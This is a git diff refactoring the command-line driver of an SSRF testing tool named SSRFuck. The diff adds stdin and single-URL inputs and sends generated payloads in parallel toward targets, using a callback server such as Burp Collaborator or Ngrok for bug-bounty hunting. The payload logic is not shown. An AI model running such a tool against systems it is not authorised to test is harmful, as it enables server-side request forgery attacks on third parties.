@@ -5,28 +5,29 @@ from concurrent.futures import ThreadPoolExecutor
 
 from lib.SSRFuck import SSRFuck
 from lib.Functions import starter
-from lib.ParamReplacer import ParamReplace
 from lib.PathFunctions import PathFunction
 
 parser = ArgumentParser(description=colored("Simple tool for SSRF", color='yellow'), epilog=colored("Check your server logs", color='yellow'))
-parser.add_argument("-w", "--wordlist", type=str, help="Absolute path to wordlist")
-parser.add_argument("-d", "--domain", type=str, help="Domain name")
-parser.add_argument("-s", "--server", type=str, help="Server name")
+input_group = parser.add_mutually_exclusive_group()
+input_group.add_argument("---", "---", dest="stdin", help="Stdin")
+input_group.add_argument("-w", "--wordlist", type=str, help="Absolute path to wordlist")
+input_group.add_argument("-u", "--url", type=str, help="Url to try")
+parser.add_argument("-s", "--server", type=str, help="Server name(Burp Collaborator/Ngrok)")
 parser.add_argument("-t", "--threads", type=int, help="Number of threads")
 parser.add_argument("-b", "--banner", action="store_true", help="Print banner and exit")
 argv = parser.parse_args()
 
-starter(argv)
+input_wordlist = starter(argv)
 FPathApp = PathFunction()
-Replacer = ParamReplace()
-ssrf_obj = SSRFuck()
-input_wordlist = [line.rstrip('\n') for line in open(argv.wordlist)]
+ssrfuck_object = SSRFuck()
 
 def main():
-    x = ssrf_obj.gen_payloads(input_wordlist, FPathApp.urler(FPathApp.slasher(argv.server)))
-    temp_x = [z for y in x for z in y]
-    with ThreadPoolExecutor(max_workers=argv.threads) as Exec:
-        futures_objects = [Exec.submit(ssrf_obj.gethead, triable) for triable in temp_x]
+    payloads_list = ssrfuck_object.generate_payloads(input_wordlist, FPathApp.urler(argv.server))
+    the_payloads = [payload for payload_list in payloads_list for payload in payload_list]
+    del payloads_list
+    with ThreadPoolExecutor(max_workers=argv.threads) as submitter:
+        futures_objects = [submitter.submit(ssrfuck_object.try_payload, triable) for triable in the_payloads]
     print(f"{ColorObject.good} Success. Check your server logs for bounty!")
 
-main()
+if __name__ == "__main__":
+    main()
